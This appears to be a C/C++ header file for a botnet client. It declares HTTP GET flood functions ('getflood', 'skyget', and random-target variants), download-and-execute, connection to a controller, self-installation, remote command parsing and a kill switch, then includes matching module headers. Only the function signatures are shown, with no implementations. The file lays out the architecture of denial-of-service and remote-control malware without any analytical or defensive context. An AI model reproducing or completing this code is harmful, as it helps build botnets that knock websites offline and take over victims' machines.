int skyget(string target,string length);
int getflood(string target,string length);
int skyget_randomTarget(string target,string length);
int getflood_randomTarget(string target,string length);
int download(string execute,string location,string destination);
int connect(int meta=0);
string name();
string serial();
int install();
void parsecommand(string command);
void KillBot();
#include "download.h"
#include "connect_and_stuff.h"
#include "getflood.h"
#include "skyget.h"
